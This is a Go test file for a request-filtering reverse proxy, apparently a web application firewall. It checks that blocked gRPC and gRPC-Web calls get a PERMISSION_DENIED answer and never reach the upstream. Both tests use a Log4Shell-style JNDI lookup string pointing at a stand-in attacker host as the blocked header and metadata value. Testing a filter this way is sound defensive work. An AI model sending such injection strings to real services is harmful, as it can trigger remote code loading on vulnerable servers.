// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package proxy

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/health/grpc_health_v1"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
)

// TestGRPCDenial: the reverse proxy answers a denied gRPC call as a gRPC
// server does: HTTP 200, trailers-only, grpc-status 7 (PERMISSION_DENIED)
// and a grpc-message. Before, it was a plain-text 403.
func TestGRPCDenial(t *testing.T) {
	tests := []struct {
		contentType string
		want        string
	}{
		{"application/grpc", "application/grpc"},
		{"application/grpc-web+proto", "application/grpc-web"},
		{"application/grpc-web-text", "application/grpc-web-text"},
	}
	for _, tt := range tests {
		t.Run(tt.contentType, func(t *testing.T) {
			up := newUpstream(t)
			var logs bytes.Buffer
			h := newHandler(t, pipeline.ModeBlock, 64, up, &logs)
			r := httptest.NewRequest(http.MethodPost, "/helloworld.Greeter/SayHello", strings.NewReader("\x00\x00\x00\x00\x00"))
			r.Host = "grpc.example.com"
			r.Header.Set("Content-Type", tt.contentType)
			r.Header.Set("X-Api-Key", "${jndi:ldap://evil.example/a}")
			r.Header.Set("X-Request-Id", "client-id-1")
			w := httptest.NewRecorder()
			h.ServeHTTP(w, r)
			if w.Code != http.StatusOK {
				t.Fatalf("status %d, want 200", w.Code)
			}
			want := map[string]string{
				"Content-Type": tt.want,
				"Grpc-Status":  "7",
				"Grpc-Message": "Forbidden (request ID client-id-1)",
				"X-Request-Id": "client-id-1",
			}
			for k, v := range want {
				if got := w.Header().Get(k); got != v {
					t.Errorf("%s %q, want %q", k, got, v)
				}
			}
			if w.Body.Len() != 0 {
				t.Errorf("body %q, want none", w.Body.String())
			}
			if up.hits.Load() != 0 {
				t.Error("the denied call reached the upstream")
			}
		})
	}
}

// TestGRPCClient: a gRPC client gets PERMISSION_DENIED with the engine's
// message. Before, it got PERMISSION_DENIED from the HTTP status, with a
// message about an unexpected HTTP status and content type.
func TestGRPCClient(t *testing.T) {
	up := newUpstream(t)
	var logs bytes.Buffer
	srv := httptest.NewUnstartedServer(newHandler(t, pipeline.ModeBlock, 1<<10, up, &logs))
	srv.Config.Protocols = new(http.Protocols)
	srv.Config.Protocols.SetUnencryptedHTTP2(true)
	srv.Start()
	t.Cleanup(srv.Close)

	conn, err := grpc.NewClient("passthrough:///"+srv.Listener.Addr().String(), grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	ctx = metadata.AppendToOutgoingContext(ctx, "x-api-key", "${jndi:ldap://evil.example/a}", "x-request-id", "client-id-2")
	_, err = grpc_health_v1.NewHealthClient(conn).Check(ctx, &grpc_health_v1.HealthCheckRequest{})
	if st := status.Convert(err); st.Code() != codes.PermissionDenied || st.Message() != "Forbidden (request ID client-id-2)" {
		t.Fatalf("attack: %v, want PermissionDenied with the engine's message", st)
	}
	if up.hits.Load() != 0 {
		t.Error("the denied call reached the upstream")
	}
}
